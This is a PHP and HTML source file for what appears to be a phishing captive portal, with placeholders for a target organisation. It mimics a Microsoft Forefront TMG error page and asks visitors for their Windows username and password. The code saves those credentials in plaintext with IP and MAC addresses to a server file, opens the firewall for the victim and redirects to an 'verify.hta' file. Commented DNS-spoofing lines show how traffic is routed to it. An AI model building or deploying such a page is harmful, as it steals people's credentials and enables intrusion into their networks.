<style>
body {
	
	background:#e5eaf5 url(bg.gif) top left repeat-x ;
	margin:0px 0px 0px 0px;
	font-family:Arial, Helvetica, sans-serif;
	min-width:1000px;
	font-size:12px;
	color:#000000;
	direction:ltr;
	}
img {border:none}


	.main {
		width:100%;
		background:url(topright.gif) top right no-repeat;
		min-width:1000px;
		min-height:400px;
		margin-left:auto;
		margin-right:auto;
		text-align:left;
	}
	
	.logo {float:left;  height:103px; }
	.sidetext {float:right; width:182px; height:52px; background:url(/Wbo-7A8AEAA5-4D7D-4B01-BEEC-6BC97E5C08B5/sidetext.png) top left; border:1px solid #2a2e31; margin-right:20px; margin-top:20px; padding:4px; }
	.sidetextNone {visibility:hidden; }
	
	.whiteline {float:left; clear:both; font-size:20px; margin-left:47px; margin-top:17px; color:#ffffff; white-space:nowrap; }
	.bold {font-weight:bold;}
	
	.maintext {float:left; margin-top:20px; clear:both; color:#000; margin-left:47px;}
	
	.color1 {color:#677183;}
	
	ul {margin-top:0; padding-left:15px; padding-top:5px; padding-bottom:5px;}
	
	ul li {list-style-image:url(bullet.gif)}
	A {
    FONT-WEIGHT: bold; COLOR: #005a80;
}
A:hover {
    FONT-WEIGHT: bold;COLOR: #0d3372;
}
</style>

<?php
// Place in the root of the webserver directory

// Rename these Variables to conform with the target environment 
$server_name = "SERVER_NAME_REPLACE";
$domain_name = "DOMAIN_NAME_REPLACE";
$site_name = "SITE_NAME_REPLACE";
 
// Path to the arp command on the local server
$arp = "/usr/sbin/arp";
 
// The following file is used to keep track of users
$users = "/var/lib/users";
 
// Check if we've been redirected by firewall to here.
// If so redirect to registration address
// Comment out to test ------->
//DNSSPOOF if ($_SERVER['SERVER_NAME']!="$server_name.$domain_name") {
//DNSSPOOF   header("location:http://$server_name.$domain_name/index.php?add="
//DNSSPOOF     .urlencode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']));
//DNSSPOOF   exit;
//DNSSPOOF }
// <---------
 
// Attempt to get the client's mac address
$mac = shell_exec("$arp -a ".$_SERVER['REMOTE_ADDR']);
preg_match('/..:..:..:..:..:../',$mac , $matches);
@$mac = $matches[0];
if (!isset($mac)) { exit; }
 
$user = $_POST['user'];
 
if (empty($user)) {
//if ($code!="1234") {
  // code doesn’t equal expected value, so display form
  ?>

	<div class="main">
        <div class="logo"><img src="logo.png" alt="ForeFront" /></div>
        <div class="whiteline"><td id=L_default_2><span class="bold">Network Access Message:</span> The page cannot be displayed </td></div>
    <div class="maintext">
    <td id=L_default_3><span class="bold color1">Explanation:</span> There is a problem with the page you are trying to reach and it cannot be displayed. </td><br />
<br />

<td id=L_default_5><span class="bold color1">To access the Internet, please logon using your Windows Credentials:</span></td><br />

  <form method='POST'>
  <table border=0 cellpadding=5 cellspacing=0>
  <tr><td><font color="BLACK" size="2" face="Arial, Helvetica, sans-serif">Username:</font></td><td><input type='text' name='user'></td></tr>
  <tr><td><font color="BLACK" size="2" face="Arial, Helvetica, sans-serif">Password:</font></td><td><input type='password' name='pass'></td></tr>
  <tr><td></td><td><input type='submit' name='submit' value='Submit'></td></tr>
  </table>
  </form>

<br />

<td id=L_default_9><span>If you are still not able to view the requested page, try contacting your administrator or Helpdesk.</span> </td><br />

<br />
<td id=L_default_10><span class="bold color1">Technical Information (for support personnel)</span></td><br />
<ul>
<li><td id=L_default_11><span class="bold">Error Code:</span></td> 403 Forbidden. Forefront TMG denied the specified Uniform Resource Locator (URL). (12202).</li>
<li><td id=L_default_12><span class="bold">IP Address:</span></td> 173.194.121.50</li>
<li><td id=L_default_13><span class="bold">Date:</span></td> 3/30/2015 6:20:51 PM [GMT]</li>
<li><td id=L_default_14><span class="bold">Server:</span></td> MFG-NYC-TMG1.mfg.prv </li>
<li><td id=L_default_15><span class="bold">Source:</span></td> proxy  </li>
</ul>
    </div>
</div>

  <?php
} else {
    enable_address();
}
 
// This function enables the PC on the system by calling iptables, and also saving the
// details in the users file for next time the firewall is reset
 
function enable_address() {
    global $user;
    global $pass;
    global $mac;
    global $users;
    file_put_contents($users,$_POST['user']."\t".$_POST['pass']."\t".$_SERVER['REMOTE_ADDR']."\t$mac\t".date("m.d.Y")."\n",FILE_APPEND + LOCK_EX);
    // Add PC to the firewall
    exec("sudo iptables -I internet 1 -t nat -m mac --mac-source $mac -j RETURN");
    // The following line removes connection tracking for the PC
    // This clears any previous (incorrect) route info for the redirection
    exec("sudo rmtrack ".$_SERVER['REMOTE_ADDR']);
ob_start();
header("Location: verify.hta");
exit;
//    sleep(1);
//    header("location:http://".$_GET['add']);
//    exit;
}

// Function to print page header
function print_header() {

  ?>
  <html>
<head>
 
<title>Error Message</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />

<style>
body {
	
	background:#e5eaf5 url(bg.gif) top left repeat-x ;
	margin:0px 0px 0px 0px;
	font-family:Arial, Helvetica, sans-serif;
	min-width:1000px;
	font-size:12px;
	color:#000000;
	direction:ltr;
	}
img {border:none}


	.main {
		width:100%;
		background:url(topright.gif) top right no-repeat;
		min-width:1000px;
		min-height:400px;
		margin-left:auto;
		margin-right:auto;
		text-align:left;
	}
	
	.logo {float:left;  height:103px; }
	.sidetext {float:right; width:182px; height:52px; background:url(/Wbo-7A8AEAA5-4D7D-4B01-BEEC-6BC97E5C08B5/sidetext.png) top left; border:1px solid #2a2e31; margin-right:20px; margin-top:20px; padding:4px; }
	.sidetextNone {visibility:hidden; }
	
	.whiteline {float:left; clear:both; font-size:20px; margin-left:47px; margin-top:17px; color:#ffffff; white-space:nowrap; }
	.bold {font-weight:bold;}
	
	.maintext {float:left; margin-top:20px; clear:both; color:#000; margin-left:47px;}
	
	.color1 {color:#677183;}
	
	ul {margin-top:0; padding-left:15px; padding-top:5px; padding-bottom:5px;}
	
	ul li {list-style-image:url(bullet.gif)}
	A {
    FONT-WEIGHT: bold; COLOR: #005a80;
}
A:hover {
    FONT-WEIGHT: bold;COLOR: #0d3372;
}
</style>
  
</head>
  <body>
  <?php
}

// Function to print page footer
function print_footer() {
  echo "</body>";
  echo "</html>";

}

?>
